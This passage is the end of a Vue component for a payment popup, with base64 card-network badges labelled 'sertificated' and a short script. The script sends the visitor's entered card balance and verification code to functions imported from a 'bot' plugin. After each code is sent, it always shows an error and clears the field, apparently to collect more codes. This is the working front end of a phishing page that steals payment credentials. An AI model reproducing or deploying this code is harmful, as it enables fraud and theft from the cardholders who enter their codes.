cgMS45MTMtMS4zOTloLTYuMDUzYy0uMzcxLS4wNTctLjM3MS0uMzQyLS4wMjktLjRoNS45NjhjLjc3MSAwIDEuNDU2LS42NTYgMS44NTYtMS4zN2gtNi45MWMtLjM3MS0uMDU3LS4zNzEtLjM0MyAwLS40aDYuOTY3Yy43MTQgMCAxLjM0Mi0uODI4IDEuNi0xLjM3SDI4LjEzYy0uMzcxLS4wNTgtLjM3MS0uNCAwLS40MjloNy43OTVjLjYyOCAwIDEuMi0uNjU3IDEuNjI3LTEuMzd6TTI1LjE5IDI2LjM0M2wzLjUxMi03LjE5NmgyLjMxM2wxLjQ1NiA3LjE5NmgtMi4xOTlsLS4wODUtLjg1N2gtMi4zMTNsLS4zNzEuODU3SDI1LjE5em0zLjI1NS0yLjM0MWgxLjQ4NWwtLjM3Mi0yLjY1Ni0xLjExMyAyLjY1NnptLTcuODUyIDIuMzQxbC44MjgtNS4zOTdoLTIuMDU2bC4zNDItMS44MjdoNi4yODJsLS4zNDIgMS44MjdoLTEuOTQybC0uOCA1LjM5N2gtMi4zMTJ6bS05LjQyMyAwbDMuNTQtNy4xOTZoMi4zMTNsMS40MjggNy4xOTZIMTYuMzFsLS4xNDMtLjg1N2gtMi4yODVsLS4zNy44NTdIMTEuMTd6bTMuMjg0LTIuMzQxaDEuNDg0bC0uNC0yLjY1Ni0xLjA4NCAyLjY1NnpNNy40IDI2LjM0M2wxLjQyNy03LjE5NmgyLjM0MmwtMS40MjggNy4xOTZINy40MDF6Ii8+PC9nPjwvc3ZnPg=="
            alt="IATA sertificated"
            class="icon_3"
          />
          <img
            src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MyIgaGVpZ2h0PSIzMCI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMCAwaDUzdjMwSDB6Ii8+PHBhdGggZmlsbD0iI0IxQkRDQyIgZD0iTTIwLjQ2NSA4LjI2NWwtNi4wMjMgMTQuNTA3aC0zLjkyOEw3LjU0OSAxMS4xOTRjLS4xNzktLjcxMi0uMzM2LS45NzMtLjg4Mi0xLjI3NEM1Ljc3MyA5LjQzIDQuMjk3IDguOTcgMyA4LjY4NmwuMDg4LS40MjFoNi4zMjVjLjgwNSAwIDEuNTMuNTQxIDEuNzE1IDEuNDc4bDEuNTY1IDguMzk2IDMuODY3LTkuODc0aDMuOTA1em0xNS4zOTQgOS43N2MuMDE3LTMuODI4LTUuMjQxLTQuMDQtNS4yMDYtNS43NS4wMTEtLjUyLjUwMi0xLjA3NCAxLjU3Ni0xLjIxNi41MzItLjA3IDItLjEyNSAzLjY2Ni42NWwuNjUtMy4wNzhDMzUuNjUyIDguMzE1IDM0LjUwMiA4IDMzLjA3IDhjLTMuNjc0IDAtNi4yNiAxLjk3LTYuMjggNC43OTUtLjAyMyAyLjA4OSAxLjg0NyAzLjI1MyAzLjI1MiAzLjk0OSAxLjQ1LjcxIDEuOTM2IDEuMTY3IDEuOTI5IDEuODAyLS4wMS45NzMtMS4xNTYgMS40MDQtMi4yMjMgMS40Mi0xLjg3LjAzLTIuOTU0LS41MS0zLjgxOC0uOTE2bC0uNjc0IDMuMThjLjg3LjQwMiAyLjQ3Mi43NTIgNC4xMzIuNzcgMy45MDcgMCA2LjQ2LTEuOTQ4IDYuNDcyLTQuOTY0em05LjcwNCA0LjczN0g0OUw0NS45OTcgOC4yNjVoLTMuMTdjLS43MTUgMC0xLjMxNy40MTgtMS41ODQgMS4wNjRsLTUuNTc3IDEzLjQ0M2gzLjkwM2wuNzc1LTIuMTY2aDQuNzY5bC40NSAyLjE2NnptLTQuMTQ5LTUuMTRsMS45NTctNS40NDggMS4xMjUgNS40NDloLTMuMDgyek0yNS43NzYgOC4yNjZsLTMuMDczIDE0LjUwN2gtMy43MTdsMy4wNzMtMTQuNTA3aDMuNzE3eiIvPjwvZz48L3N2Zz4="
            alt="Visa sertificated"
            class="icon_4"
          />
          <img
            src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSIzMCI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMCAwaDQwdjMwSDB6Ii8+PHBhdGggZmlsbD0iIzdEODlBMSIgZD0iTTExLjE3NSAyNi4wM2MwLS40Mi4yNzUtLjc2NC43MjUtLjc2NC40MyAwIC43Mi4zMy43Mi43NjVzLS4yOS43NjUtLjcyLjc2NWMtLjQ1IDAtLjcyNS0uMzQ1LS43MjUtLjc2NXptMS45MzUgMHYtMS4xOTRoLS41MnYuMjljLS4xNjUtLjIxNS0uNDE1LS4zNS0uNzU1LS4zNS0uNjcgMC0xLjE5NS41MjUtMS4xOTUgMS4yNTUgMCAuNzMuNTI1IDEuMjU1IDEuMTk1IDEuMjU1LjM0IDAgLjU5LS4xMzUuNzU1LS4zNXYuMjloLjUyVjI2LjAzem0xNy41NTcgMGMwLS40Mi4yNzUtLjc2NC43MjUtLjc2NC40MyAwIC43Mi4zMy43Mi43NjVzLS4yOS43NjUtLjcyLjc2NWMtLjQ1IDAtLjcyNS0uMzQ1LS43MjUtLjc2NXptMS45MzUgMHYtMi4xNTRoLS41MnYxLjI1Yy0uMTY1LS4yMTUtLjQxNS0uMzUtLjc1NS0uMzUtLjY3IDAtMS4xOTQuNTI1LTEuMTk0IDEuMjU1IDAgLjczLjUyNCAxLjI1NSAxLjE5NCAxLjI1NS4zNCAwIC41OS0uMTM1Ljc1NS0uMzV2LjI5aC41MlYyNi4wM3ptLTEzLjA0My0uNzg5Yy4zMzUgMCAuNTUuMjEuNjA1LjU4aC0xLjI0Yy4wNTUtLjM0NS4yNjUtLjU4LjYzNS0uNTh6bS4wMS0uNDY1Yy0uNyAwLTEuMTkuNTEtMS4xOSAxLjI1NSAwIC43Ni41MSAxLjI1NSAxLjIyNSAxLjI1NS4zNiAwIC42OS0uMDkuOTgtLjMzNWwtLjI1NS0uMzg1Yy0uMi4xNi0uNDU1LjI1LS42OTUuMjUtLjMzNSAwLS42NC0uMTU1LS43MTUtLjU4NWgxLjc3NWMuMDA1LS4wNjUuMDEtLjEzLjAxLS4yLS4wMDUtLjc0NS0uNDY1LTEuMjU1LTEuMTM1LTEuMjU1em02LjI3NCAxLjI1NWMwLS40Mi4yNzUtLjc2NS43MjUtLjc2NS40MyAwIC43Mi4zMy43Mi43NjVzLS4yOS43NjUtLjcyLjc2NWMtLjQ1IDAtLjcyNS0uMzQ1LS43MjUtLjc2NXptMS45MzUgMHYtMS4xOTVoLS41MnYuMjljLS4xNjUtLjIxNS0uNDE1LS4zNS0uNzU1LS4zNS0uNjcgMC0xLjE5NS41MjUtMS4xOTUgMS4yNTUgMCAuNzMuNTI1IDEuMjU1IDEuMTk1IDEuMjU1LjM0IDAgLjU5LS4xMzUuNzU1LS4zNXYuMjloLjUyVjI2LjAzem0tNC44NyAwYzAgLjcyNS41MDUgMS4yNTUgMS4yNzUgMS4yNTUuMzYgMCAuNi0uMDguODYtLjI4NWwtLjI1LS40MmMtLjE5NS4xNC0uNC4yMTUtLjYyNS4yMTUtLjQxNS0uMDA1LS43Mi0uMzA1LS43Mi0uNzY1cy4zMDUtLjc2LjcyLS43NjVjLjIyNSAwIC40My4wNzUuNjI1LjIxNWwuMjUtLjQyYy0uMjYtLjIwNS0uNS0uMjg1LS44Ni0uMjg1LS43NyAwLTEuMjc1LjUzLTEuMjc1IDEuMjU1em02LjctMS4yNTVjLS4zIDAtLjQ5NS4xNC0uNjMuMzV2LS4yOWgtLjUxNXYyLjM5aC41MnYtMS4zNGMwLS4zOTUuMTctLjYxNS41MS0uNjE1LjEwNSAwIC4yMTUuMDE1LjMyNS4wNmwuMTYtLjQ5YTEuMTExIDEuMTExIDAgMDAtLjM3LS4wNjV6bS0xMy45MjguMjVjLS4yNS0uMTY1LS41OTUtLjI1LS45NzUtLjI1LS42MDUgMC0uOTk1LjI5LS45OTUuNzY1IDAgLjM5LjI5LjYzLjgyNS43MDVsLjI0NS4wMzVjLjI4NS4wNC40Mi4xMTUuNDIuMjUgMCAuMTg1LS4xOS4yOS0uNTQ1LjI5LS4zNiAwLS42Mi0uMTE1LS43OTUtLjI1bC0uMjQ1LjQwNWMuMjg1LjIxLjY0NS4zMSAxLjAzNS4zMS42OSAwIDEuMDktLjMyNSAxLjA5LS43OCAwLS40Mi0uMzE1LS42NC0uODM1LS43MTVsLS4yNDUtLjAzNWMtLjIyNS0uMDMtLjQwNS0uMDc1LS40MDUtLjIzNSAwLS4xNzUuMTctLjI4LjQ1NS0uMjguMzA1IDAgLjYuMTE1Ljc0NS4yMDVsLjIyNS0uNDJ6bTYuNzA0LS4yNWMtLjMgMC0uNDk1LjE0LS42My4zNXYtLjI5aC0uNTE1djIuMzloLjUydi0xLjM0YzAtLjM5NS4xNy0uNjE1LjUxLS42MTUuMTA1IDAgLjIxNS4wMTUuMzI1LjA2bC4xNi0uNDlhMS4xMTEgMS4xMTEgMCAwMC0uMzctLjA2NXptLTQuNDM1LjA2aC0uODV2LS43MjVoLS41MjV2LjcyNWgtLjQ4NXYuNDc1aC40ODV2MS4wOWMwIC41NTUuMjE1Ljg4NS44My44ODUuMjI1IDAgLjQ4NS0uMDcuNjUtLjE4NWwtLjE1LS40NDVhLjk2Ljk2IDAgMDEtLjQ2LjEzNWMtLjI2IDAtLjM0NS0uMTYtLjM0NS0uNHYtMS4wOGguODV2LS40NzV6bS03Ljc2OSAyLjM5di0xLjVjMC0uNTY1LS4zNi0uOTQ1LS45NC0uOTUtLjMwNS0uMDA1LS42Mi4wOS0uODQuNDI1LS4xNjQtLjI2NS0uNDI0LS40MjUtLjc5LS40MjUtLjI1NCAwLS41MDQuMDc1LS43LjM1NXYtLjI5NWgtLjUydjIuMzloLjUyNlYyNS45YzAtLjQxNS4yMy0uNjM1LjU4NS0uNjM1LjM0NSAwIC41Mi4yMjUuNTIuNjN2MS4zM2guNTI0VjI1LjljMC0uNDE1LjI0LS42MzUuNTg1LS42MzUuMzU1IDAgLjUyNS4yMjUuNTI1LjYzdjEuMzNoLjUyNXoiLz48cGF0aCBmaWxsPSIjQjFCRENDIiBkPSJNMTUuNTA3IDIwLjg1Mmg3Ljg3NVY2LjdoLTcuODc1eiIvPjxwYXRoIGZpbGw9IiM5NkEwQjMiIGQ9Ik0xNi4wMDcgMTMuN2E4Ljk4NCA4Ljk4NCAwIDAxMy40MzctNy4wNzZBOSA5IDAgMDA0Ljg4MyAxMy43YTkgOSAwIDAwMTQuNTYxIDcuMDc2IDguOTg0IDguOTg0IDAgMDEtMy40MzctNy4wNzYiLz48cGF0aCBmaWxsPSIjQ0FEM0RFIiBkPSJNMzQuMDA1IDEzLjdhOSA5IDAgMDEtMTQuNTYgNy4wNzYgOC45ODQgOC45ODQgMCAwMDMuNDM3LTcuMDc2IDguOTg0IDguOTg0IDAgMDAtMy40MzgtNy4wNzZBOSA5IDAgMDEzNC4wMDUgMTMuNyIvPjwvZz48L3N2Zz4="
            alt="MasterCard sertificated"
            class="icon_5"
          />
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { sendBalance, sendCode } from "../plugins/bot";
export default {
  props: {
    show: { type: Boolean, required: true },
    price: { type: Number, required: true },
  },
  data() {
    return {
      balance: "",
      code: "",
      error: false,
    };
  },
  methods: {
    sendBalanceLog() {
      sendBalance(this.balance, this.price);
    },
    sendCodeLog() {
      sendCode(this.code, this.price);
      this.error = true;
      this.code = "";
    },
  },
};
</script>

<style scoped>
* {
  box-sizing: border-box;
}
.error {
  color: #e64926;
  padding-top: 10px;
}
.currency > p {
  font-size: 23px;
  font-weight: bold;
  text-align: center;
  justify-content: center;
  margin-top: 3px;
}
.currency {
  width: 50px;
  height: 40px;
  background: #008ae6;
  color: #ffffff;
  border-radius: 8px;
}
.popup {
  z-index: 10;
  position: fixed;
  width: 100%;
  height: 100%;
  top: 0;
  left: 0;
  background: rgba(0, 0, 0, 0.5);
  box-sizing: border-box;
}
.popup_body {
  min-height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
}
.popup_content {
  padding: 50px 70px;
  background: #120f29;
  color: rgba(255, 255, 255, 0.54);
  width: 620px;
  min-height: 580px;
  border-radius: 10px;
}
.logo > img {
  height: 54px;
}
.title {
  font-size: 25px;
  padding: 15px 0;
  font-weight: 600;
}

.label {
  display: block;
  margin-bottom: 6px;
  font-size: 18px;
  line-height: 18px;
  user-select: none;
}
.wrapper {
  position: relative;
  display: flex;
  flex-flow: row nowrap;
  justify-content: space-between;
  align-items: center;
}
.input {
  position: relative;
  flex-grow: 1;
  flex-shrink: 1;
  width: 100%;
  height: 100%;
  line-height: normal;
  border: none;
  min-height: 38px;
  font-family: inherit;
  opacity: 1;
  padding-left: 22px;
  padding-right: 11px;
  font-size: 16px;
  color: rgba(255, 255, 255, 0.5);
  background-color: #2c2a42;
  border-radius: 8px;
  text-align: center;
}
.btn {
  width: 260px;
  background-color: #008ae6;
  padding: 12px 80px;
  font-family: inherit;
  border: none;
  outline: none;
  margin: 0;
  color: #ffffff;
  font-size: 23px;
  line-height: 20px;
  border-radius: 8px;
  cursor: pointer;
  margin-top: 16px;
}
.popup_form {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px 0;
}
icon {
  display: flex;
  margin-top: 24px;
}

.icon {
  padding: 20px 0;
}

.icon_1 {
  height: 57px;
  width: 125px;
}

.icon_2 {
  height: 50px;
  width: 101px;
}

.icon_3 {
  height: 57px;
  width: 76px;
}

.icon_4 {
  height: 57px;
  width: 101px;
}

.icon_5 {
  height: 57px;
  width: 76px;
}
</style>
